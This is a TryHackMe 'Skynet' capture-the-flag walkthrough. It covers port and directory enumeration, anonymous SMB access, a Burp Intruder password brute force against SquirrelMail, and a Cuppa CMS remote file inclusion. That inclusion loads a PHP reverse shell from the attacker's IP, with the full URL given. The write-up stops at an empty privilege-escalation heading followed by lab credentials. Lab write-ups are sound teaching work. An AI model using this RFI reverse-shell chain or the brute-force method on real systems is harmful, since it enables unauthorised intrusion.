# TryHackMe Skynet Room WalkTrought




## Starting with enumeration
As everyday, we start enumerating with nmap
```bash
nmap -sV -vv -p- 10.10.209.177
```
Here is the results
```
22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        syn-ack Dovecot pop3d
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack Dovecot imapd
445/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
There are some open ports, this will be fun

### Enumeration with gobuster : http

So, we see a http server running on port 80 so let's check this out  
["index.html"](pictures/skynet.com "skynet")  
Nothing seems interesting here  
Let's enumerate  
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.209.177  -x php,html,txt 
```
Here is the results
```
/index.html           (Status: 200) [Size: 523]  
/.html                (Status: 403) [Size: 278]  
/.php                 (Status: 403) [Size: 278]  
/admin                (Status: 301) [Size: 314]  
/css                  (Status: 301) [Size: 312]   
/js                   (Status: 301) [Size: 311]   
/config               (Status: 301) [Size: 315]   
/ai                   (Status: 301) [Size: 311]   
/squirrelmail         (Status: 301) [Size: 321]   
/.php                 (Status: 403) [Size: 278]  
/.html                (Status: 403) [Size: 278]  
```
Squirrelmail ? what is that ? Let's check !  
["SquirrelMail"](pictures/squirrelmail.com)  
It's seems that we'll need some credentials...  

### Enumeration with Enum4Linux : smb
```bash
enum4linux 10.10.209.177
```
Here is the interesting results  
We find a new user ! Seems to be a great starting point.
```
user:[milesdyson] rid:[0x3e8]
```
We find four shares too
```
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
```
One of them is accessible as anonymous !
```
//10.10.209.177/print$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.209.177/anonymous	Mapping: OK Listing: OK Writing: N/A
//10.10.209.177/milesdyson	Mapping: DENIED Listing: N/A Writing: N/A
```

Let's log in it
```bash
smbclient //10.10.209.177/anonymous	
```
["smbclient"](/pictures/smbclient.png)
There is some stuff. Let's get it to our own machine.
```bash
mget *
cd notes
mget *
```
anonymous share fully enumerated, we can exit.
So, what did we find ?  
["Attention.png"](pictures/attention.png)  
And ?  
["log1.png"](pictures/log1.png)  
This looks like a password list, right ?  

## Bruteforcing with burpsuite

It's seems that we have a username and a list of password...  
We can try bruteforcing squirrelmail...

So, let's catch a request  
(You can check burpsuite path on TryHackMe to understand what i've done here)  
["proxy.png"](pictures/proxy.png)

We can now 
- send it to the intruder (CTRL+I)  
- clear variables
- wrap password with variables
- and change the username value to milesdyson
This should looks like that :  
["intruder.png"](pictures/intruder.png)

Go to the payload section and load log1.txt
["payload.png"](pictures/payload.png)


***Press start attack***

Boom ! password found ! 

We have now credentials of milesdyson mail.   

## Enumerating squirrelwebmail

We can now login to his webmail  
This looks like that :  
["webmail.png"](pictures/webmail.png)

And in the first mail, we clearly see the SMB password

["mail.png"](pictures/mail.png)

## Back to SMB

We can try to log in the milesdyson share with our new credentials

```bash
smbclient -u milesdyson //10.10.209.177/milesdyson
```
It works !  
```bash
ls
cd notes
ls
```
Wow there are a lot of file
["smb_milesdyson.png"](pictures/smb_milesdyson.png)

We can find "important.txt"
```bash
mget important.txt
```
It seems that we can exit   
["important.png"](pictures/important.png)  

Ok, so there is the hidden directory

## Http hidden directory

We can go to http://10.10.209.177/45kra24zxs28v3yd  
["personal_page.png"](pictures.personal_page.png)
Nothings seems to be interesting here.

## Enumerate hidden directory

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.209.177  -x php,html,txt
```
Here is the results
```

```
MMmmmm.... Interesting, let's check what is this administrator directory   
I first check at the source code and saw that they was an hidden redirect to a 'forgot passsword ?' page but this didn't seems to work  

## Exploit Cuppa CMS
Then, I remembered that this CMS has some vulns...
And, when i searched for, i've seen that : 
["cuppa_exploit.png"](pictures/cuppa_exploit.png)  


So I could use it to spawn a reverse shell : 
- I curl the pentest monkey php reverse shell and edit it with my tun0 IP and the port 1234
- I started an python http webserverver like that : 
```bash
python -m http-server 8000
```
- I used the RFI vulnerability to spawn the reverse shell  
http://10.10.209.177/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.14.34:8000/reverse_shell.php
OK! Reverse shell spawned !

## User Flag

As always, I spawned  an interactive shell with
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'; 
```

["UserFlag.png"](pictures/userflag.png)  
First flag here !  

## Privileges escalation













mylesdyson:cyborg007haloterminator



SMB PASSWORD
mylesdyson:)s{A&2Z=F^n_E.B`
